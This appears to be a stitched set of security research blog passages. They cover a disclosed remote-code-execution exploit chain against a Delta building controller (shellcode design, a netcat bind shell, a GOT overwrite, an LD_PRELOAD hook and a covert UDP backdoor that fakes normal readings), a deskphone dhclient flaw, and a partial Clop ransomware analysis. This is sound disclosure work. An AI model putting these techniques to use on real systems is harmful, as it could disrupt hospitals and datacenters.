An ideal scenario would be executing code that would allow remote shell access to the device. Fortunately, Netcat is present on the device and this version of Netcat supports both the “-ll” flag, for persistent listening on a port for a connection, and the “-e” flag, for executing a command on connection. Thus, we could use 
:\/:
 to execute Netcat to listen on some port and execute a shell when a connection is made. Before writing shell code to execute 
:\/:
 with this command, we first tested various Netcat commands on the device directly to determine the shortest Netcat command that would still give us a shell. After a few iterations, we were able to shorten the Netcat command to 13 bytes:
:\/:
Since the instructions must be 4-byte-aligned and we have 32 bytes to work with, we are only concerned with the length of the string rounded up to the nearest multiple of 4, so in this case 16 bytes. Subtracting this from our total 32 bytes, we have 16 bytes left, or 4 instructions total, to set up the argument for 
:\/:
 and jump to it. A common method to fit more instructions into a small space in memory on ARM is to switch to Thumb mode. This is because ARM’s Thumb mode utilizes 16-bit (2-byte) instructions, instead of the regular 32-bit (4-byte) ARM instructions. Unfortunately, the processor on this device did not support Thumb mode and therefore this was not an option.
:\/:
The challenge to accomplishing our task in only 4 ARM instructions is the limit ARM places on immediate values. To jump to 
:\/:
, we needed to use an immediate value as the address to jump to, but memory address are not generally small values. Immediate values in ARM are limited to 12 bits; eight of these bits are for the value itself and the other 4 are used for bit shifting. This means that an immediate value can only be one byte long (two hex digits) but that byte can be zero padded in any fashion you like. Therefore, loading a full memory address of 4 bytes using immediate values would take all 4 instructions, whether using MOV or ADD. While we do have 4 instructions to play with, we also need at least one instruction to load the address of our command string into R0, the register used as the first parameter for system, and at least one instruction to branch to the address, requiring a total of 6 instructions.
:\/:
One way to reduce the number of instructions needed is to start by copying a register already containing a value close to the address we want at the time the shellcode executes. Whether this is feasible depends on the value of the address we want to jump to compared to the addresses we have available in the registers right before our shell code is executed.
:\/:
Starting with the address we need to call, we discovered three address we could jump to that would call 
:\/:
Next, we compared these options to the values in the registers at the time the shellcode is about to execute using GDB, shown in Figure 25.
:\/:
Of the registers we have access to at the time our shell code executes, the one that gives us the smallest delta between its contents and one of these three addresses we can use to call 
:\/:
 is R4. R4 contains 0x40235CB4, giving a delta of 0x517F0 when compared to the address for a direct call to 
:\/:
. The last nibble being 0 is ideal since that means we don’t have to account for the last bit, thanks to the rotation mechanism inherent to ARM immediate values. This means that we only need two immediate values to convert the contents of R4 into our desired address: one for 0x51000, the other for 0x7F0. Since we can apply an immediate offset when MOV’ing one register into another, we should be able to load a register with the address of 
:\/:
 in only two instructions. With one instruction for performing the branch and 16 bytes for the command string, this means we can get all our shell code in 32 bytes, assuming we can load R0 with the address of our string in one instruction.
:\/:
By starting our ASCII string for the command directly after the fourth and last instruction, we can copy PC into R0 with the appropriate offset to make it point to the string. An added benefit of this approach is that it makes the string’s address independent of where the shell code is placed into memory, since it’s relative to PC. Figure 26 shows what the shellcode looks like with consideration for all restrictions.
:\/:
It is important to note that the “.asciz” assembler directive is used to place a null-terminated ASCII string literal into memory. R12 was chosen as the register to contain the address of branch, since R12 is the Intra Procedural (IP) scratch space register on the ARM architecture. This means R12 is often used as a general-purpose register within subroutines indicating it is almost certainly safe to clobber for our purposes without experiencing unexpected adverse effects.
:\/:
With a firm understanding of the vulnerability, exploit, and the shellcode needed we could now attempt exploitation. Looking at the sequence of packets used to cause this attack, it is not a single packet attack, but a multiple packet attack. The initial buffer overflow is contained in the large malformed packet, so what data do we build into it? This packet is overwriting memory but not providing control over execution; therefore, this can be considered the “setup” or “staging” packet. This is where memcpy will look for the address of the destination buffer for our last packet. The address we want to overwrite goes in this packet followed by our shellcode. As explained above, the address we are looking to overwrite is the address of the scDecodeBACnetUDP function pointer in the GOT minus one, to ensure the address isn’t 4-byte aligned. By repairing the last byte of the previous function pointer and overwriting this address, we can gain execution control.
:\/:
The large malformed packet contains “where” we want to “write” to and puts our shellcode into memory yet does not contain “what” we want to write. The “what”, in this case, is the address of our shellcode, so our last packet needs to contain this address. The final challenge is deciding where in the last packet the address belongs.
:\/:
Recall from the core dump shown previously that the crash happens on memcpy attempting to write the value 0x81 to the bad address. 0x81 is the first byte of the BVLC layer, indicating this where our address needs to go within the last packet to ensure that only the address we want is overwritten. We also need to ensure there are not any bytes after our address, otherwise we will continue to overwrite the GOT past our target address. Since this application is a multi-threaded application, this could cause the application to crash before our shellcode has a chance to execute. Since the BVLC layer is typically how a packet is identified as a BACnet packet, a potential problem with altering this layer is that the last packet will no longer look like a BACnet packet. If this is the case, will the application still ingest the packet? The team tested this and discovered that the application will ingest any broadcast packet regardless of type, since the vulnerable code is executed before the code that validates the packet type.
:\/:
Taking everything into account and sending the series of 97 packets, we were able to successfully exploit the building manager by creating a bind shell. Below is a video demonstrating this attack:
:\/:
Although providing a root shell to an attacker proves the vulnerability is exploitable, what can an attacker do with it? A shell by itself does not prove useful unless an attacker can control the normal operation of the system or steal valuable data. In this case, there is not a lot of useful data stored on the device. Someone could download information about how the system is configured or what it’s controlling, which may have some value, but this will not hold significant impact on its own. It is also plausible to delete essential system files via a denial-of-service attack that could easily put the target in an unusable state, but pure destruction is also of low value for various reasons. First, as mentioned previously, the device has a backup image that it will fall back to if a failure occurs during the boot process. Without physical access to the device, an attacker wouldn’t have a clear idea of how the backup image differs from the original or even if it is exploitable. If the backup image uses a different version of the firmware, the exploit may no longer work. Perhaps more importantly, a denial-of-service attack suffers from its inherent lack of subtlety. If the attack immediately causes alarms to go off when executed, the attacker can expect that their persistence in the system will be short-lived.
:\/:
What if the system could be controlled by an attacker while being undetected?  This scenario becomes more concerning considering the type of environments controlled by this device.
:\/:
Controlling the standard functions of the device from just a root shell requires a much deeper understanding of how the device works in a normal setting. Typically, the Delta eBMGR is programmed by an installer to perform a specific set of tasks. These tasks can range from managing access control, to building lighting, to HVAC, and more. Once programmed, the controller is connected to several external input/output (I/O) modules. These modules are utilized for both controlling the state of an attached device and relaying information back to the manager. To replicate these “normal conditions”, we had a professional installer program our device with a sample program and attach the appropriate modules.
:\/:
Figure 27 shows how each component is connected in our sample programming.  For our initial testing, we did not actually have the large items such as the pump, boiler and heating valve. The state of these items can be tracked through either LEDs on the modules or the touchscreen interface, hence it was unnecessary for us to acquire them for testing purposes. Despite this, it is still important to note which type of input or output each “device”, virtual or otherwise, is connected to on the modules.
:\/:
The programming to control these devices is surprisingly simple. Essentially, based on the inputs, an output is rendered. Figure 28 shows the programming logic present on the device during our testing.
:\/:
There are three user-defined software variables: “Heating System”, “Room Temp Spt”, and “Heating System Enable Spt”.  Here, “spt” indicates a set point. These can be defined by an operator at run time and help determine when an output should be turned on or off. The “Heating System” binary variable simply controls the on/off state of the system.
:\/:
Like when we first started looking for vulnerabilities, we want to ensure our method of controlling the device is not dependent on code which could vary from controller to controller. Therefore, we want to find a method that allows us to control all the I/O devices attached to a Delta eBMGR, ensuring we are not dependent on this device’s specific programming.
:\/:
As on any Linux-based system, the installer-defined programming at its lowest level utilizes system calls, or functions, to control the attached hardware. By finding a way to manipulate these functions, we would therefore have a universal method of controlling the modules regardless of the installer programming.  A very common way of gaining this type of control when you have root access to a system is through the use of function hooking. The first challenge for this approach is simply determining which function to hook. In our case, this required an extensive amount of reverse engineering and debugging of the system while it was running normally. To help reduce the scope of functions we needed to investigate, we began by focusing our attention on controlling binary output (BO). Our first challenge was how to find the code that handles changing the state of a binary output.
:\/:
A couple of key factors helped point us in the right direction. First, the documentation for the controller indicates the devices talk to the I/O modules over a Controller Area Network Bus (CAN bus), which is common for PLC devices.  As previously seen, the Delta binaries all have symbols included.  Thus, we can use the function names provided in the binaries to help reduce the code surface we need to look at – IDA tells us there are only 28 functions with “canio” as the first part of their name. Second, we can assume that since changing the state of a BO requires a call to physical hardware, a Linux system call is needed to make that change. Since the device is making a change to an IO device, it is highly likely that the Linux system call used is “ioctl”. When cross-referencing the functions that start with “canio” and that call “ioctl”, our prior search space of 28 drops to 14. One function name stood out above the rest: “canioWriteOutput”. The decompiled version of the function has been reproduced in Figure 29.
:\/:
Using this hypothesis, we set a break point on the call to “ioctl” inside canioWriteOutput and use the touchscreen to change the state of one of the binary outputs from “off” to “on”. Our breakpoint was hit! Single stepping over the breakpoint, we were able to see the correct LED light up, indicating the output was now on.
:\/:
Now knowing the function we needed to hook, the question quickly became: How do we hook it? There are several methods to accomplish this task, but one of the simplest and most stable is to write a library that the main binary will load into memory during its startup process, using an environment variable called LD_PRELOAD. If a path or multiple paths to shared objects or libraries are set in LD_PRELOAD before executing a program, that program will load those libraries into its memory space before any other shared libraries. This is significant, because when Linux resolves a function call, it looks for function names in the order in which the libraries are loaded into memory. Therefore, if a function in the main Delta binary shares a name and signature with one defined in an attacker-generated library that is loaded first, the attacker-defined function will be executed in its place. As the attacker has a root shell on the device, it is possible for them to modify the init scripts to populate the LD_PRELOAD variable with a path to an attacker-generated library before starting the Delta software upon boot, essentially installing malware that executes upon reboot.
:\/:
Using the cross-compile toolchain created in the early stages of the project, it was simple to test this theory with the “library” shown in Figure 30.
:\/:
The code above doesn’t do anything meaningful, but it does confirm if hooking this method will work as expected.  We first defined a function pointer using the same function prototype we saw in IDA for canioWriteOutput.  When canioWriteOutput is called, our function will be called first, creating an output file in the “opt” directory and giving us a place to write text, proving that our hook is working. Then, we search the symbol table for the original “canioWriteObject” and call it with the same parameters passed into our hook, essentially creating a passthrough function. The success of this test confirmed this method would work.
:\/:
For our function hook to do more than just act as a passthrough, we needed to understand what parameters were being passed to the function and how they affect execution. By using GDB, we could examine the data passed in during both the “on” and “off” states. For canioWriteObject, it was discovered that the state of binary output was encoded into the second parameter passed to the function. From there, we could theoretically control the state of the binary output by simply passing the desired state as the second parameter to the real function, leaving the other parameters as-is. In practice, however, the state change produced using this method persisted only for a split second before the device reset the output back to its proper state.
:\/:
Why was the device returning the output to the correct state? Is there some type of protection in place? Investigating strings in the main Delta binary and the filesystem on the device led us to discover that the device software maintains databases on the filesystem, likely to preserve device and state information across reboots. At least one of these databases is used to store the state of binary outputs along with, presumably, other kinds of I/O devices. With further investigation using GDB, we discovered that the device is continuously polling this database for the state of any binary outputs and then calling canioWriteOutput to publish the state obtained from the database, clobbering whatever state was there before. Similarly, changes to this state made by a user via the touchscreen are stored in this same database. At first, it may appear that the simplest solution would be to change the database value since we have root access to the device. However, the database is not in a known standard format, meaning we would need to take the time to reverse this format and understand how the data is stored. As we already have a way to hook the functions, controlling the outputs at the time canioWriteOutput is called is simpler.
:\/:
To accomplish this, we updated our malware to keep track of whether the attacker has made a modification to the output or not. If they have, the hook function replaces the correct state, stored in canioWriteOutput’s second parameter, with the state asserted by the attacker before calling the real canioWriteOutput function. Otherwise, the hook function acts as a simple passthrough for the real deal. A positive side effect of this, from the attacker’s perspective, is the touchscreen will show the output as the state the user last requested even after the malware has modified it. Implementing this simple state-tracking resolved our prior issue of the attacker-asserted state not persisting.
:\/:
With control of the binary output, we moved on to looking at each of the other types of inputs and outputs that can be connected to the modules. We used a similar approach in identifying the methods used to read or write data from the modules and then hooking them. Unfortunately, not every function was as simple as canioWriteOutput. For example, when reversing the functions used to control analog outputs, we noticed that they utilized custom data structures to hold various information about the analog device, including its state. As a result, we had to first reverse the layout of these data structures to understand how the analog information was being sent to the outputs before we could modify their state. By using a combination of static and dynamic analysis, we were able to create a comprehensive malicious library to control the state of any device connected to the manager.
:\/:
Although making changes from a root shell certainly proves that an attacker can control the device once it has been exploited, it is more practical and realistic for the attacker to have complete remote control not contingent on an active shell. Since we were already loading a library on startup to manipulate the I/O modules, we decided it would also be feasible to use that same library to create a command-and-control type infrastructure. This would allow an attacker to just send commands remotely to the “malware” without having to maintain a constant connection or shell access.
:\/:
To bring this concept to life, we needed to create a backdoor and an initialization function was probably the best place to put one. After some digging, we found “canioInit”, a function responsible for initializing the CAN bus. Since the CAN bus is required to make any modifications to the operation of the device, it made sense to wait for this function to be called before starting our backdoor. Unlike some of the previous hooks mentioned, we don’t make any changes to this call or its return data; we only use it as a method to ensure our backdoor is started at the proper time.
:\/:
When canioInit is called, we first spawn a new thread and then execute the real canioInit function.  Our new thread opens a socket on UDP port 1337 and listens for very specific commands, such as “bo0 on” to indicate to “turn on binary output 0” or “reset” to put the device back in the user’s control. Based on the commands provided, the “set_io_state” method called by this thread activates the necessary hooking methods to control the I/O as described in the previous section.
:\/:
With a fully functioning backdoor in the memory space of the Delta software, we had full control of the device with a realistic attack chain. Figure 33 outlines the entire attack.
:\/:
The entire process above, from sending out the malicious packets to gaining remote control, takes under three minutes, with the longest task being the reboot. Once the attacker has established control, they can operate the device without impacting what information the user is provided, allowing the attacker to stay undetected and granting them ample opportunity to cause serious damage, depending on what kind of hardware the Delta controller manages.
:\/:
What is the impact of an attack like this? These controllers are installed in multiple industries around the world. Via Shodan, we have observed nearly 600 internet-accessible controllers running vulnerable versions of the firmware.  We tracked eBMGR devices from February 2019 to April 2019 and found that there were a significant number of new devices available with public IP addresses.
:\/:
As of early April 2019, 492 eBMGR devices remained reachable via internet-wide scans using Shodan. Of those found, a portion are almost certainly honeypots based on user-applied tags found in the Shodan data, leaving 404 potentially vulnerable victims. If we include other Delta Controls devices using the same firmware and assume a high likelihood they are vulnerable to the same exploit, the total number of potential targets balloons to over 1600. We tracked 119 new internet connected eBMGR devices since February 2019; however, these were outpaced by the 216 devices that have subsequently gone offline. We believe this is a combination of standard practice for ICS systems administrators to connect these devices to the Internet, coupled with a strategy by the vendor (Delta Controls) proactively reaching out to customers to reduce the internet-connected footprint of the vulnerable devices. Most controllers appear to be in North America with the US accountable for 53% of online devices and Canada accounting for 35%. It is worth noting the fact that in some cases the IP address, and hence the geographic location of the device from Shodan, is traced back to an ISP (Internet Service Provider), which could result in skewed findings for locations.
:\/:
Some industries seem more at risk than others given the accessibility of devices. We were only able to map a small portion of these devices to specific industries, but the top three categories we found were Education, Telecommunications, and Real Estate. Education included everything from elementary schools to universities. In academic settings, the devices were sometimes deployed district-wide, in numerous facilities across multiple campuses. One example is a public-school system in Canada where each school building in the district had an accessible device.  Telecommunications was comprised entirely of ISPs and/or phone companies. Many of these could be due to the ISPs being listed as a service provider. The real estate category generally included office and apartment buildings. From available metadata in the search results, we also managed to find instances of education, healthcare, government, food, hospitality, real estate, child care and financial institutions using the vulnerable product.
:\/:
With a bit more digging, we were easily able to find other targets through publicly available information. While it is not common practice to post sensitive documents online, we’ve found many documents available that indicate that these devices are used as part of the company’s building automation plans. This was particularly true for government buildings where solicitations for proposals are issued to build the required infrastructure. All-in-all we have collected around 20 documents that include detailed proposals, requirements, pricing, engineering diagrams, and other information useful for reconnaissance. One particular government building had a 48-page manual that included internal network settings of the devices, control diagrams, and even device locations.
:\/:
What does it matter if an attacker can turn on and off someone’s AC or heat?  Consider some of the industries we found that could be impacted. Industries such as hospitals, government, and telecommunication may have severe consequences when these systems malfunction. For example, the eBMGR is used to maintain positive/negative pressure rooms in medical facilities or hospitals, where the slightest change in pressurization could have a life-threating impact due to the spread of airborne diseases.  Suppose instead a datacenter was targeted. Datacenters need to be kept at a cool temperature to ensure they do not overheat. If an attacker were to gain access to the vulnerable controller and use it to raise heat to critical levels and disable alarms, the result could be physical damage to the server hardware in mass, as well as downtime costs, not to mention potential permanent loss of critical data.  According to the Ponemon Institute (https://www.ponemon.org/library/2016-cost-of-data-center-outages), the average cost of a datacenter outage was as high as $740,357 in 2016 and climbing. Microsoft was a prime example of this; in 2018, the company suffered a massive datacenter outage (https://devblogs.microsoft.com/devopsservice/?p=17485) due to a cooling failure, which impacted services for around 22 hours.
:\/:
To show the impact beyond LED lights flashing, McAfee’s ATR contracted a local Delta installer to build a small datacenter simulation with a working Delta system. This includes both heating and cooling elements to show the impact of an attack in a true HVAC system. In this demonstration we show both normal functionality of the target system, as well as the full attack chain, end-to-end, by raising the temperature to dangerous levels, disabling critical alarms and even faking the controller into thinking it is operating normally. The video below shows how this simple unpatched vulnerability could have devastating impact on real systems.
:\/:
We also leverage this demo system, now located in our Hillsboro research lab, to highlight how an effective patch, in this case provided by Delta Controls, is used to immediately mitigate the vulnerability, which is ultimately our end goal of this research project.
:\/:
Discoveries such as CVE-2019-9569 underline the importance of secure coding practices on all devices. ICS devices such as this Delta building manager control critical systems which have the potential to cause harm to businesses and people if not properly secured.
:\/:
There are some best practices and recommendations related to the security of products falling into nonstandard environments such as industrial controls. Based on the nature of the devices, they may not have the same visibility and process control as standard infrastructure such as web servers, endpoints and networking equipment. As a result, industrial control hardware like the eBMGR PLC may be overlooked from various angles including network or Internet exposure, vulnerability assessment and patch management, asset inventory, and even access controls or configuration reviews. For example, a principle of least privilege policy may be appropriate, and a network isolation or protected network segment may help provide boundaries of access to adversaries. An awareness of security research and an appropriate patching strategy can minimize exposure time for known vulnerabilities. We recommend a thorough review and validation of each of these important security tenants to bring these critical assets under the same scrutiny as other infrastructure.
:\/:
One goal of the McAfee Advanced Threat Research team is to identify and illuminate a broad spectrum of threats in today’s complex and constantly evolving landscape. As per McAfee’s vulnerability public disclosure policy, McAfee’s ATR informed and worked directly with the Delta Controls team.  This partnership resulted in the vendor releasing a firmware update which effectively mitigates the vulnerability detailed in this blog, ultimately providing Delta Controls’ consumers with a way to protect themselves from this attack. We strongly recommend any businesses using the vulnerable firmware version (571848 or prior) update as soon as possible in line with your patch policy and testing strategy. Of special importance are those systems which are Internet-facing. McAfee customers are protected via the following signature, released on August 6th: McAfee Network Security Platform 0x45d43f00 BACNET: Delta enteliBUS Manager (eBMGR) Remote Code Execution Vulnerability.
:\/:
We’d like to take a minute to recognize the outstanding efforts from the Delta Controls team, which should serve as a poster-child for vendor/researcher relationships and the ability to navigate the unique challenges of responsible disclosure.  We are thrilled to be collaborating with Delta, who have embraced the power of security research and public disclosure for both their products as well as the common good of the industry. Please refer to the following

), with products targeting a wide spectrum of customers, from small business and midmarket, to large corporations. As part of the ongoing McAfee Advanced Threat Research effort into researching critical vulnerabilities in widely deployed software and hardware, we decided to have a look at the Avaya 9600 series IP Deskphone. We were able to find the presence of a Remote Code Execution (RCE) vulnerability in a piece of open source software that Avaya likely copied and modified 10 years ago, and then failed to apply subsequent security patches to. The bug affecting the open source software was reported in 2009, yet its presence in the phone’s firmware remained unnoticed until now. Only the H.323 software stack is affected (as opposed to the SIP stack that can also be used with these phones), and the Avaya Security Advisory (ASA) can be found here 
:\/:
The video below demonstrates how an attacker can leverage this bug to take over the normal operation of the phone, exfiltrate audio from its speaker phone, and potentially “bug” the phone. The current attack is conducted with the phone directly connected to an attacker’s laptop but would also work via a connection to the same network as a vulnerable phone. The full technical details can be found 
:\/:
, while the rest of this article will give a high-level overview on how this bug was found and some consideration regarding its resolution. The firmware image Avaya published on June 25
:\/:
. As a user, you can verify if your Deskphone is vulnerable: first determine if you have one of the affected models (9600 Series, J100 Series or B189), then you can find which firmware version your phone is using in the “About Avaya IP Deskphone” screen under the Home menu, version 6.8.1 and earlier are vulnerable when using a H.323 firmware (SIP versions are not affected).
:\/:
When studying the security of embedded and IoT devices, researchers generally have a couple of goals in mind to help kickstart their research. In most cases, two of the main targets are recovering the files on the system so as to study how the device functions, and then finding a way to interact directly with the system in a privileged fashion (beyond what a normal user should be able to do). The two can be intertwined, for instance getting a privileged access to the system can enable a researcher to recover the files stored on it, while recovering the files first can show how to enable a privileged access.
:\/:
In this case, recovering the files was straightforward, but gaining a privileged access required a little more patience.
:\/:
When we say recovering the files from the phone, we mean looking for the operating system and the various pieces of software running on it. User files, e.g. contacts, settings and call logs, are usually not of interest to a security researcher and will not be covered here. To recover the files, the easiest approach is to look for firmware updates for the device. If we are lucky, they will be freely available and not encrypted. In most cases, an encrypted firmware does not increase the security of the system but rather raises the barrier of entry for security researchers and attackers alike. In this case, we are in luck, Avaya’s website serves firmware updates for its various phone product lines and anyone can download them. The download contains multiple tar files (a type of archive file format). We can then run a tool called 
:\/:
binwalk on the extracted files. Binwalk is a large dictionary of patterns that represents known file formats; given
:\/:
 an unknown firmware file, it will look for any known pattern and, upon finding potential matches, will attempt to process them accordingly. For instance, if it finds what looks like a .zip file inside the firmware, it will try to unzip it. Running this tool is always a good first step when facing an unknown firmware file as, in most cases, it will identify useful items for you.
:\/:
When processing the phone’s firmware, extracting the files and running binwalk on them gave us the program the phone runs at startup (the bootloader), the Linux kernel used by the phone, and a JFFS filesystem that contains all the phone’s binaries and configuration files. This is a great start, as from there we can start understanding the inner workings of the device and look for bugs.  At this stage however, we are limited to performing a static analysis: we can look at the files and peek at the assembly instructions of various binaries, but we cannot execute them. To make life easier, there are usually two options. The first one is to emulate the whole phone, or at least some region of interest, while the other is to get a privileged access to the system, to inspect what is running on it as well as run debugging tools. Best results come when you mix and match all these options appropriately. For the sake of simplicity, we will only cover the latter, but both were used in various ways to help us in our research.
:\/:
In most cases, when talking about gaining privileged access to an IoT/embedded device, security researchers are on the lookout for an administrative interface called a root shell that lets them execute any code they want with the highest level of privilege. Sometimes, one is readily available for maintenance purposes; other times more effort is required to gain access to it, assuming one is present in the first place. This is when hardware hacking comes into play; security researchers love to rip open devices and void warranties, looking for potential debug ports, gatekeepers of the sought-after privileged access.
:\/:
In the picture above, we can see two debug ports labeled UART0 and UART1. This type of test point, where the copper is directly exposed, is commonly used during the manufacturing process to program the device or verify everything is working properly. UART stands for Universal Asynchronous Receiver-Transmitter and is meant for two-way communication. This is the most likely place where we can find the administrative access we are looking for. By buying a $15 
:\/:
 that converts UART to USB and soldering wires onto the test pads, we can see debug information being printed on screen when the phone boots up, but soon the flow of debug information dries up. This is a curious behavior—why stop the debug messages?—so we need to investigate more. By using a disassembler to convert raw bytes into computer instructions, we can peek into the code of the bootloader recovered earlier and find out that during the boot process the phone fetches settings from external memory to decide whether the full set of debug features should be enabled on the serial console. The external memory is called an 
:\/:
 and is easily identifiable on the board, first by its shape and then by the label printed on it. Labels on electronic components are used to identify them and to retrieve their associated datasheet, the technical documentation describing how to use the chip from an electrical engineering standpoint. Soldering wires directly to the chip under a microscope, and connecting it to a programmer (a $30 gizmo called a 
:\/:
), allows us to change the configuration stored on it and enable the debug capabilities of the phone.
:\/:
Rebooting the phones gives us much more debug information and, eventually, we are greeted with the root shell we were after.
:\/:
Confirmation we have a root shell. Unrelated debug messages are being printed while we are invoking the “whoami” command
:\/:
The approach described above is fairly lengthy and is only interesting to security researchers in a similar situation. A more generic technique would be to directly modify the filesystem by altering the flash storage (a NAND Flash on the back of the circuit board) as we did for previous 
:\/:
, and then automatically start an SSH server or a remote shell. Another common technique is to tamper with the NAND flash while the filesystem is loading in memory, to get the bootloader in an exception state that will then allow the researcher to modify the boot arguments of the Linux kernel. Otherwise, to get remote shell access, using an older firmware with known RCE vulnerabilities is probably the easiest method to consider; it can be a good starting point for security researchers and is not threatening to regular users as they should already have the most up-to-date software. All things considered, these methods are not a risk to end-users and are more of a stepping stone for security researchers to conduct their research.
:\/:
After gaining access to a root shell and the ability to reverse engineer the files on the phone, we are faced with the open-ended task to look for potentially vulnerable software. As the phone runs Linux, the usual command line utilities people use for administering Linux systems are readily available to us. It is natural to look at the list of processes running, find the ones having network connection and so forth. While poking around, it becomes clear that one of the utilities, dhclient, is of great interest. It is already running on the system and handles network configuration (the so-called DHCP requests to configure the phone’s IP address). If we invoke it in the command line, the following is printed:
:\/:
Showing a detailed help screen describing its expected arguments is normal behavior, but a 2004-2007 copyright is a big red flag. A quick search confirms that the 4.0.0 version is more than 10 years old and, even worse, an 
:\/:
 targeting it is publicly available. Dhclient code is open source, so finding the differences between two successive version is straightforward. Studying the exploit code and how the bug was patched helps us to narrow down which part of the code could be vulnerable. By once again using a disassembler, we confirm the phone’s version of dhclient is indeed vulnerable to the bug reported in 2009. Converting the original exploit to make it work on the phone requires a day or two of work, while building the proof of concept demonstrated in the above video is a matter of mere hours. Indeed, all the tools to stream audio from the phone to a separate machine are already present on the system, which greatly reduces the effort to create this demo. We did not push the exploitation further than the Proof of Concept shown in the above video, but we can assume that at this point, building a weaponized version able to threaten private networks is more of a software engineering task and a skilled attacker might only need a few weeks, if not days, to put one together.
:\/:
Upon finding the flaw, we immediately notified Avaya with detailed instructions on how to reproduce the bug and suggested fixes. They were able to fix, test and release a patched firmware image in approximately two months. At the time of publication, the fix will have been out for more than 30 days, leaving IT administrators ample time to deploy the new image. In a large enterprise setting, it is pretty common to first have a testing phase where a new image is being deployed to selected devices to ensure no conflict arises from the deployment. This explains why the timeline from the patch release to deployment to the whole fleet may take longer than what is typical in consumer grade software.
:\/:
IoT and embedded devices tend to blend into our environment, in some cases not warranting a second thought about the security and privacy risks they pose. In this case, with a minimal hardware investment and free software, we were able to uncover a critical bug that remained out-of-sight for more than a decade. Avaya was prompt to fix the problem and the threat this bug poses is now mitigated, but it is important to realize this is not an isolated case and many devices across multiple industries still run legacy code more than a decade old. From a system administration perspective, it is important to consider all these networked devices as tiny black-box computers running unmanaged code which should be isolated and monitored accordingly. The McAfee Network Security Platform (NSP) detects this attack as “DHCP: Subnet Mask Option Length Overflow” (signature ID: 0x42601100), ensuring our customers remain protected. Finally, for the technology enthusiasts reading this, the barrier of entry to hardware hacking has never been this low, with plenty of online resources and cheap hardware to get started. Looking for this type of vulnerability is a great entry point to information security and will help make the embedded world a safer place.

This new ransomware was discovered by Michael Gillespie on 8 February 2019 and it is still improving over time. This blog will explain the technical details and share information about how this new ransomware family is working. There are some variants of the Clop ransomware but in this report, we will focus on the main version and highlight part of those variations. The main goal of Clop is to encrypt all files in an enterprise and request a payment to receive a decryptor to decrypt all the affected files. To achieve this, we observed some new techniques being used by the author that we have not seen before. Clearly over the last few months we have seen more innovative techniques appearing in ransomware.
:\/:
The Clop ransomware is usually packed to hide its inner workings. The sample we analyzed was also signed with the following certificate in the first version (now revoked):
:\/:
Signing a malicious binary, in this case ransomware, may trick security solutions to trust the binary and let it pass. Although this initial certificate was revoked in a few days, another version appeared soon after with another certificate:
:\/:
This malware is prepared to avoid running under certain conditions, for example in the first version it requests to be installed as a service; if that will not succeed, it will terminate itself.
:\/:
The malware’s first action is to compare the keyboard of the victim computer using the function “GetKeyboardLayout”  against the hardcoded values.
:\/:
The malware checks that the layout is bigger than the value 0x0437 (Georgian), makes some calculations with the Russian language (0x0419) and with the Azerbaijan language (0x082C). This function will return 1 or 0, 1 if it belongs to Russia or another CIS country, or 0 in every other case.
:\/:
If the function returns 0, it will go to the normal flow of the malware, otherwise it will get the device context of the entire screen with the function “GetDC”. Another condition will come from the function “GetTextCharset” that returns the font used in the system if it does not have the value 0xCC (RUSSIAN_CHARSET). If it is the charset used, the malware will delete itself from the disk and terminate itself with “TerminateProcess” but if it is not this charset, it will continue in the normal flow This double check circumvents users with a multisystem language, i.e. they have the Russian language installed but not active in the machine to avoid this type of malware.
:\/:
The code that is supposed to delete the ransomware from the disk contains an error. It will call directly to the prompt of the system without waiting for the malware to finish.  This means that the execution of the command will be correct but, as the malware is still running, it will not delete it from the disk. This happens because the author did not use a “timeout” command.
:\/:
The next action of the malware is to create a new thread that will start all processes. With the handle of this thread, it will wait for an infinite amount of time to finish with the “WaitForSingleObject” function and later return to the winMain function and exit.
:\/:
This thread’s first action is to create a file called “Favorite” in the same folder as the malware. Later, it will check the last error with “GetLastError” and, if the last error was 0,  it will wait with the function “Sleep” for 5 seconds.
:\/:
Later the thread will make a dummy call to the function “EraseTape” with a handle of 0, perhaps to disturb the emulators because the handle is put at 0 in a hardcoded opcode, and later a call to the function “DefineDosDeviceA” with an invalid name that returns another error. These operations will make a loop for 666000 times.
:\/:
If some of these processes are discovered, the malware will wait 5 seconds using “Sleep” and later another 5 seconds. After those “sleep”, the malware will continue with their normal flow. If these processes are not detected, it will access to their own resources and extract it with the name “OFFNESTOP1”. That resource is encrypted but has inside a “.bat” file.
:\/:
“Po39NHfwik237690t34nkjhgbClopfdewquitr362DSRdqpnmbvzjkhgFD231ed76tgfvFAHGVSDqhjwgdyucvsbCdigr1326dvsaghjvehjGJHGHVdbas”.
:\/:
The next action is to write this batch file in the same folder where the malware stays with the function “CreateFileA”.  The file created has the name “clearsystems-11-11.bat”. Later will launch it with “ShellExecuteA”, wait for 5 seconds to finish and delete the file with the function “DeleteFileA”.
:\/:
It is clear that the authors are not experienced programmers because they are using a .bat file for the next actions:
:\/:
Resize the shadow storage for all units starting from C to H units’ letters (hardcoded letters) to avoid the shadow volumes being made again.
:\/:
Using bcedit program to disable the recovery options in the boot of the machine and set to ignore any failure in the boot warning the user.
:\/:
All these actions could have been performed in the malware code itself, without the need of an external file that can be detected and removed.
:\/:
The next action is to create a mutex with the name hardcoded “Fany—Fany—6-6-6” and later make a call to the function “WaitForSingleObject” and check the result with 0.  If the value is 0 it means that the mutex was created for this instance of the malware but if it gets another value, it means that the mutex was made from another instance or vaccine and, in this case, it will finish the execution of the malware.
:\/:
After this, it will make 2 threads, one of them to search for processes and the another one to crypt files in the network shares that it has access to.
:\/:
The first thread enumerates all processes of the system and creates the name of the process in upper case and calculates a hash with the name and compares it with a big list of hashes. This hash algorithm is a custom algorithm. It is typical in malware that tries to hide what processes they are looking for. If it finds one of them it will terminate it with “TerminateProcess” function after opening with the rights to make this action with “OpenProcess” function.
:\/:
The malware contains 61 hard-coded hashes of programs such as “STEAM.EXE”, database programs, office programs and others.
:\/:
Below, the first 38 hashes with the associated process names. These 38 processes are the most usual processes to close as we have observed with other ransomwares families such as GandCrab, Cerber, etc.
:\/:
This thread runs in an infinite loop with a wait using the function “Sleep” per iteration of 30 minutes.
:\/:
The second thread created has the task of enumerating all network shares and crypts files in them if the malware has access to them.
:\/:
This thread starts creating a reserve of memory with “GlobalAlloc” function to keep the information of the “MPR” functions.
:\/:
For each network share that the malware discovers, it will prepare to enumerate more shares and crypt files.
:\/:
For each folder discovered, it will enter it and search for more subfolders and files. The first step is to check the name of the folder/file found against a hardcoded list of hashes with the same algorithm used to detect the processes to close.
:\/:
If it passes, it will check that the file is not a folder, and in this case compare the name with a list of hardcoded names and extensions that are in plain text rather than in hash format:
:\/:
